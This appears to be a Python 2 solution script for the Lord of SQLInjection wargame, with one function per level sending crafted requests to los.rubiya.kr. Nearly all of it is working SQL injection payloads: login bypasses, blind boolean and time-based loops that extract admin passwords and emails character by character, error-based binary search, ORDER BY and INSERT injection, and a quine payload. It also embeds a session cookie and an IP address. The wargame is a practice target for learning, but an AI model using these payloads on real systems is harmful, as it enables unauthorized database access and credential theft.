#-*- coding:utf-8 -*-
import requests

headers = {
	"Cookie": "PHPSESSID=pkpf9vsq7hhb1tu5lg6dlpomf7"
}

def res(url, params):
	r = requests.get(url, headers=headers, params=params)
	print r.content.replace("<br />", "\n")
	return r.content.replace("<br />", "\n")


def gremblin():
	url = "http://los.rubiya.kr/gremlin_280c5552de8b681110e9287421b834fd.php"

	params = {
		'id': "' or 1=1#-- -",
		'pw': ''
	}

	res(url, params)

def cobolt():
	url = "http://los.rubiya.kr/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"

	params = {
		'id': "admin' #-- -",
		'pw': ''
	}

	res(url, params)

def goblin():
	url = "http://los.rubiya.kr/goblin_e5afb87a6716708e3af46a849517afdc.php"

	params = {
		#'no': "0 or id=char(97,100,109,105,110) #-- -",
		'no': '0 or id=0x61646d696e #-- -'
	}

	res(url, params)	

def orc():
	# 095a9852
	url = "http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

	password = ''
	for i in range(len(password), 10):
		for j in range(0x30, 0x7b):
			if j >= 0x3a and j <= 0x40: continue
			if j >= 0x5b and j <= 0x60: continue

			params = {
				'pw': "1' or id='admin' and substr(pw, %d, 1)=0x%x#-- -" % (i, j)
			}

			r = requests.get(url, params=params, headers=headers)

			if "Hello admin" in r.content:
				password += chr(j)
				print password
				break

def wolfman():
	url = "http://los.rubiya.kr/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"

	params = {
		'pw': "1'||id='admin'#--#"
	}

	res(url, params)		

def darkelf():
	url = "http://los.rubiya.kr/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"

	params = {
		'pw': "1'||id='admin'#--#"
	}

	res(url, params)	

def orge():
	url = "http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php"

	password = '7'
	for i in range(len(password)+1, 10):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)
			if j >= 0x3a and j <= 0x40: continue
			if j >= 0x5b and j <= 0x60: continue

			#query = "1'||id='admin'&&length(pw)=8#--#"

			params = {
				'pw': "'||id='admin'&&substr(pw,%d,1)=0x%x#--#" % (i, j)
				#'pw': "'||id='admin'&&substr(pw,1,1)=0x37#--#"# % (i, j)
			}

			#print "query : [" + "'||id='admin'&&substr(pw,%d,1)=0x%x#--#" % (i, j) + "]"

			r = requests.get(url, params=params, headers=headers)
			#print r.content

			#exit()
			if r.content.find("Hello admin") != -1:
				password += chr(j)
				print "password : [" + password +"]"
				break
		if i != len(password):
			print "fail"
			break

def troll():
	url = "http://los.rubiya.kr/troll_05b5eb65d94daf81c42dd44136cb0063.php"

	params = {
		'id': "aDmin"
	}

	res(url, params)		

def vampire():
	url = "http://los.rubiya.kr/vampire_e3f1ef853da067db37f342f3a1881156.php"

	params = {
		'id': "adAdminmin"
	}

	res(url, params)		

def skeleton():
	url = "http://los.rubiya.kr/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"

	params = {
		'pw': "' or id='admin'#--#"
	}

	res(url, params)	

def golem():
	url = "http://los.rubiya.kr/golem_4b5202cfedd8160e73124b5234235ef5.php"

	# 77d6290b
	password = '77d62'
	for i in range(len(password)+1, 10):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)
			if j >= 0x3a and j <= 0x40: continue
			if j >= 0x5b and j <= 0x60: continue

			#query = "1'||id='admin'&&length(pw)=8#--#"

			params = {
				'pw': "'||id like 'admin' && ascii(mid(pw,%d,1)) like %d#--#" % (i, j)
			}

			r = requests.get(url, params=params, headers=headers)

			if r.content.find("Hello admin") != -1:
				password += chr(j)
				print "password : [" + password +"]"
				break
		if i != len(password):
			print "fail"
			break

def darknight():
	url = "http://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"

	password = ''
	for i in range(len(password)+1, 10):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)
			if j >= 0x3a and j <= 0x40: continue
			if j >= 0x5b and j <= 0x60: continue

			if chr(j) == '%': continue

			params = {
				'pw': "",
				'no': "1 or id like 0x61646d696e and mid(pw,%d,1) like 0x%x#--#" % (i, j)
			}

			r = requests.get(url, params=params, headers=headers)

			if r.content.find("Hello admin") != -1:
				password += chr(j)
				print "password : [" + password +"]"
				break
		if i != len(password):
			print "fail"
			break

def bugbear():
	url = "http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"

	# 52dc3991
	password = '52dc'
	for i in range(len(password)+1, 10):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)
			if j >= 0x3a and j <= 0x40: continue
			if j >= 0x5b and j <= 0x60: continue

			if chr(j) == '%': continue

			params = {
				'pw': "",
				#'no': "1 or id in 'admin' and mid(pw,%d,1) like 0x%x#--#" % (i, j)
				'no': "0||(id)in(\"admin\")&&hex(mid(pw,%d,1))in(hex(%d))#--#" % (i, j)
			}

			r = requests.get(url, params=params, headers=headers)

			#print r.content
			#exit()

			if r.content.find("Hello admin") != -1:
				password += chr(j)
				print "password : [" + password +"]"
				break
		if i != len(password):
			print "fail"
			break

def giant():
	url = "http://los.rubiya.kr/giant_18a08c3be1d1753de0cb157703f75a5e.php"

	params = {
		'shit': "\x0b"
	}

	res(url, params)		

def assassin():
	url = "http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php"

	# admin : 902_____
	password = ''
	for i in range(len(password)+1, 10):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)
			if j >= 0x3a and j <= 0x40: continue
			if j >= 0x5b and j <= 0x60: continue

			if chr(j) == '%': continue

			params = {
				'pw': "%s%s" % (password + chr(j), "_"*(8-1-len(password)))
			}

			r = requests.get(url, params=params, headers=headers)

			if r.content.find("Hello admin") != -1:
				print "Admin !!"
				password += chr(j)
				print "password : [" + password +"]"
				raw_input()
				exit()

			if r.content.find("Hello guest") != -1:
				password += chr(j)
				print "password : [" + password +"]"
				break


		if i != len(password):
			print "fail"
			break


def zombie_assassin():
	url = "http://los.rubiya.kr/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php"

	params = {
		'id': "\x00' or 1=1#--#",
		'pw': ""
	}

	res(url, params)

def succubus():
	url = "http://los.rubiya.kr/succubus_37568a99f12e6bd2f097e8038f74d768.php"

	params = {
		'id': "\\",
		'pw': " union select 1#--#"
	}

	res(url, params)	

def nightmare():
	url = "http://los.rubiya.kr/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"

	params = {
		'pw': "')=0;\x00"
	}

	res(url, params)	

def xavis():
	url = "http://los.rubiya.kr/xavis_04f071ecdadb4296361d2101e4a2c390.php"

	'''
	# 0000c6b00000c6550000ad73
	print unichr(0x0000c6b0)
	print unichr(0x0000c655)
	print unichr(0x0000ad73)
	'''
	password = ''
	for i in range(len(password)+1, 15):
		for j in range(0x20, 0xff+1):
			print "try ... ", hex(j)

			# 0xc6af
			# 0xad73

			#tmp = "\x00\x00\xc6\xaf\x00\x00\xad\x73".decode("utf-8")

			params = {
				#'pw': "' or id='admin' and mid(pw,%d,1)=0x%x#--#" % (i, j)
				#'pw': "' or id='admin' and pw=0x0000c6b0000c6550000ad73#--#"
				#'pw': "' or id='admin' and pw=0x0000c6b00000c6550000ad73#--#"
				#'pw': "' or id='admin' and mid(pw,4,1)=0#--#"
				'pw': '0000c6b00000c6550000ad73'.decode('utf-8')
			}

			r = requests.get(url, params=params, headers=headers)
			print r.content
			exit()

			if r.content.find("Hello admin") != -1:
				password += chr(j)
				print "password : [" + password +"]"
				break

		if i != len(password):
			print "fail"
			break

	'''
	#password = [0xc6af]
	password = []
	for i in range(len(password)+1, 12+1, 2):
		start = 0
		end = 0x100000000
		
		flag = True
		while flag:
			mid = (start + end) / 2

			print mid
			params = {
				#'pw': "' or id='admin' and mid(pw,%d,1)>0x%x#--#"# % (i, j)
				'pw': "' or id='admin' and mid(pw,%d,1)>0x%x#--#" % (i, mid)
				#'pw': "' or id='admin' and mid(pw,3,1)>0x%x#--#" % (0xad80)
			}

			r = requests.get(url, params=params, headers=headers)
			#print r.content
			#exit()

			if r.content.find("Hello admin") != -1:
				# true
				start = mid
			else:
				end = mid

			if end - start < 2:
				flag = -1
				for j in range(start, end+0x10):
					params = {
						'pw': "' or id='admin' and mid(pw,%d,1)=0x%x#--#" % (i, j)
					}
					print params['pw']

					r = requests.get(url, params=params, headers=headers)

					if r.content.find("Hello admin") != -1:
						flag = j
						password.append(j)
						print "password : ", password
						print 'start : %d, end : %d, mid : %d -> answer : %d' % (start, end, mid, j)
						break

				if flag == -1:
					print "not found"
					exit()

				flag = False
	'''

def dragon():
	url = "http://los.rubiya.kr/dragon_51996aa769df79afbf79eb4d66dbcef6.php"

	params = {
		'pw': "'\x0a and 0 or id='admin'#--#"
	}

	res(url, params)

def iron_golem():
	url = "http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

	#password = [0xc6af]
	#password = [0xb8e8, 0xbe44, 0xaebc, 0xc57c, 0, 0xbe7c, 0xc560, 0xc560, 0xc560, 0xc560, 0xc560, 0xc560, 0xc560, 0xc561, 0, 0, 0]
	password = []
	for i in range(len(password)+1, 20):
		start = 0
		end = 0x100000000
		
		flag = True
		while flag:
			mid = (start + end) / 2

			print mid
			params = {
				#'pw': "' or if(length(pw)=60, (select 1 union select 2), 'hackability')#--#"
				'pw': "' or if(mid(pw,%d,1)>=0x%x, (select 1 union select 2), 'hackability')#--#" % (i, mid)
				#'pw': "' or if(mid(pw,5,1)=0xaf, (select 1 union select 2), 'hackability')#--#" 
			}
			
			# password :  [0xb8e8, 0xaebc]
			r = requests.get(url, params=params, headers=headers)
			#print r.content
			#exit()

			if r.content.find("returns more than 1 row") != -1:
				# true
				start = mid
				mid = (start + end) / 2
			else:
				end = mid
				mid = (start + end) / 2

			if end - start <= 2:
				flag = -1
				for j in range(start-0x10, end+0x10):
					params = {
						#'pw': "' or if(length(pw)=60, (select 1 union select 2), 'hackability')#--#"
						'pw': "' or if(mid(pw,%d,1)=0x%x, (select 1 union select 2), 'hackability')#--#" % (i, j)
					}
					print params['pw']

					r = requests.get(url, params=params, headers=headers)

					if r.content.find("returns more than 1 row") != -1:
						print 'query : [' + params['pw'] + ']'
						flag = j
						password.append(j)
						
						for k in password:
							print unichr(k), hex(k)
						print

						print "password : ", password
						print 'start : %d, end : %d, mid : %d -> answer : %d' % (start, end, mid, j)
						break

				if flag == -1:
					print "not found"
					exit()

				flag = False

	'''
	params = {
		#'pw': "' or if(length(pw)=60, (select 1 union select 2), 'hackability')#--#"
		'pw': "' or if(length(mid(pw,1,1))=4, (select 1 union select 2), 'hackability')#--#"
	}

	r = requests.get(url, params=params, headers=headers)
	print r.content
	'''

def dark_eyes():
	url = "http://los.rubiya.kr/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"

	# 5a2f5d3c
	password = ''
	for i in range(len(password)+1, 10):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)
			if j >= 0x3a and j <= 0x40: continue
			if j >= 0x5b and j <= 0x60: continue

			if chr(j) == '%': continue

			params = {
				'pw': "' or id='admin' and (select 1 union select mid(pw,%d,1)=0x%x) #--#" % (i, j)
			}

			r = requests.get(url, params=params, headers=headers)

			if len(r.content) != 0:
				password += chr(j)
				print "password : [" + password +"]"
				break

		if i != len(password):
			print "fail"
			break


def hellfire():

	url = "http://los.rubiya.kr/hell_fire_309d5f471fbdd4722d221835380bb805.php"

	password = 'ADM_N_SECURE_EMAIL@EMAI1.COM'
	for i in range(len(password)+1, 30):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)

			#if chr(j) == '%': continue

			# 	# ?order=(case substring(email,%d,1) when '%c' then score else 'gg' end) 
			params = {
				'order': "(case substring(email,%d,1) when 0x%x then score else 'gg' end)" % (i, j)
				#'order': "(case substring(email,4,1) when '1' then score else 'gg' end)"
				#'order': "(case length(email)>10 when 1 then score else 'id' end"
				#'order': "score"
			}

			r = requests.get(url, params=params, headers=headers)

			idx1 = r.content.find("rubiya805@gmail.cm")
			idx2 = r.content.find("admin")
			
			if idx1 > idx2:
				password += chr(j)
				print "password : [" + password +"]"
				break

		if i != len(password):
			print "fail"
			break	

def evil_wizard():
	url = "http://los.rubiya.kr/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"

	password = 'AASUP3R_SECURE_EMAIL@EMAI1.COM'
	for i in range(len(password)+1, 32):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)

			#if chr(j) == '%': continue

			# 	# ?order=(case substring(email,%d,1) when '%c' then score else 'gg' end) 
			params = {
				'order': "(case substring(email,%d,1) when 0x%x then score else 'gg' end)" % (i, j)
				#'order': "(case substring(email,4,1) when '1' then score else 'gg' end)"
				#'order': "(case length(email)>10 when 1 then score else 'id' end"
				#'order': "score"
			}

			r = requests.get(url, params=params, headers=headers)

			idx1 = r.content.find("rubiya805@gmail.com")
			idx2 = r.content.find("admin")
			
			if idx1 > idx2:
				password += chr(j)
				print "password : [" + password +"]"
				break

		if i != len(password):
			print "fail"
			break	

def green_dragon():
	url = "http://los.rubiya.kr/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php"

	params = {
		'id': "\\",
		'pw': " union select 0x5c, 0x%s#--#" % (' union select 0x61646d696e#--#'.encode('hex'))
	}

	res(url, params)	

def red_dragon():
	url = "http://los.rubiya.kr/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"

	password = ''
	for i in range(len(password)+1, 30):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)

			params = {
				'id': "'||pw<#",
				#'no': "0x" + "1\n||if(length(pw)>1,sleep(10),1)#--#".encode("hex")
				'no': "\n0x%s%x" % (password, j)
			}

			r = requests.get(url, params=params, headers=headers)
			
			if r.content.find("Hello admin") != -1:
				password += hex(j-1)[2:]
				print password, password.decode("hex")
				print "correct"
				break

def blue_dragon():
	import time
	url = "http://los.rubiya.kr/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"

	# d948b8a0
	password = ''
	for i in range(len(password)+1, 30):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)
			if j >= 0x3a and j <= 0x40: continue
			if j >= 0x5b and j <= 0x60: continue

			# ?id=admin' and if(substring(pw, %d,1)='%c', sleep(3), 1) ;--%20 <-- %d에는 숫자, %c에는 문자를 넣어서 BF
			params = {
				'id': "admin' and if(substring(pw,%d,1)=0x%x,sleep(3), 1)#--#" % (i, j)
			}

			start = time.time()
			r = requests.get(url, params=params, headers=headers)
			end = time.time()

			if (end - start) >= 3:
				password += chr(j)
				print "password : [" + password +"]"
				break

def frankenstein():
	import time
	url = "http://los.rubiya.kr/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"

	password = '3044433445'
	for i in range(1, 30):
		for j in range(0x23, 0x7f):
			print "try ... ", hex(j)
			#if j >= 0x3a and j <= 0x40: continue
			#if j >= 0x5b and j <= 0x60: continue

			params = {
				#'pw': "' or id='admin' and pw like '%s%c%%' and #--#" % (password, j)
				'pw': "' or id='admin' and case when pw<0x%s%x then 1-~1 end#--#" % (password, j)
				#'pw': "' or id='admin' and pw like '%s%c%%' and 1-~1#--#" % (password, j)
			}

			print 'param : [' + params['pw'] + ']'

			r = requests.get(url, params=params, headers=headers)

			if len(r.content) < 200:
				password += hex(j-1)[2:]
				print "password : [" + password +"]", password.decode("hex")
				break	


def phantom():
	import time
	url = "http://los.rubiya.kr/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php"

	params = {
		'joinmail': "1'), (0, '58.233.199.146', (select email from prob_phantom x where ip='127.0.0.1')), (0, '58.233.199.146', 'a')#--#"
	}

	res(url, params)	

	return

	password = ''
	for i in range(len(password)+1, 30):
		for j in range(0x21, 0x7f):
			print "try ... ", hex(j)
			#if j >= 0x3a and j <= 0x40: continue
			#if j >= 0x5b and j <= 0x60: continue

			# ?id=admin' and if(substring(pw, %d,1)='%c', sleep(3), 1) ;--%20 <-- %d에는 숫자, %c에는 문자를 넣어서 BF
			params = {
				#'joinmail': "1'), (1, '58.233.199.146', (select 'a' from prob_phantom where ip='127.0.0.1' and if(mid(email,%d,1)=0x%x, sleep(3), 1))) #--#" % (i, j)
				'joinmail': "1'), (0, '58.233.199.146', ( if(substring(email,%d,1)=0x%x, sleep(3), 1)) ) #--#" % (i, j)
			}

			start = time.time()
			r = requests.get(url, params=params, headers=headers)
			end = time.time()

			if (end - start) >= 3:
				password += chr(j)
				print "password : [" + password +"]"
				break

# 34 : "
# 39 : '
# 36 : $
def ouroboros():
	url = "http://los.rubiya.kr/ouroboros_e3f483f087c922c84373b49950c212a9.php"

	test = "' UNION SELECT REPLACE(REPLACE('\" UNION SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'\" UNION SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine#') AS Quine#"

	# ' UNION SELECT REPLACE(REPLACE("' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine",CHAR(39),CHAR(34)),CHAR(36),"' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine") AS Quine
	# ' UNION SELECT REPLACE(REPLACE("' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine",CHAR(39),CHAR(34)),CHAR(36),"' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine") AS Quine

	'''
	' union select REPLACE(REPLACE(REPLACE('\' union select REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'\' union select REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#'),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#
	'''
	#test = "' union select REPLACE(REPLACE(REPLACE('' union select REPLACE(REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#--#',CHAR(34),CHAR(39)),CHAR(36),'' union select REPLACE(REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#--#'),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#--#"
	print test

	'''
	" UNION SELECT REPLACE(REPLACE("' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine#--#",CHAR(39),CHAR(34)),CHAR(36),"' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine#--#") AS Quine#--#

	' UNION SELECT REPLACE(REPLACE("' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine#--#",CHAR(39),CHAR(34)),CHAR(36),"' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine#--#") AS Quine#--#

	' UNION SELECT REPLACE(REPLACE(\"' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine#--#\",CHAR(39),CHAR(34)),CHAR(36),\"' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS Quine#--#\") AS Quine#--#
	'''

	params = {
		'pw': test
	}

	data = res(url, params)	
	print
	print data.find('Pw ')

def zombie():
	url = "http://los.rubiya.kr/zombie_78238dee92f8ed0f508b0e9e00fc0e49.php"

	test = "' union select mid(info,38,67) from information_schema.processlist#"

	print test

	params = {
		'pw': test
	}

	data = res(url, params)	
	print
	print data.find('Pw ')

def alien():
	url = "http://los.rubiya.kr/alien_91104597bf79b4d893425b65c166d484.php"

	# ?no=1 union select left(0x61646d696e, 4^(second(now())%2)^sleep(1))#' union select left(0x61646d696e, 5^(second(now())%2)^sleep(1))#

	params = {
		"no": "1 union select left(0x61646d696e, 4^(second(now())%2)^sleep(1))#' union select left(0x61646d696e, 5^(second(now())%2)^sleep(1))#"
	}
	res(url, params)	

iron_golem()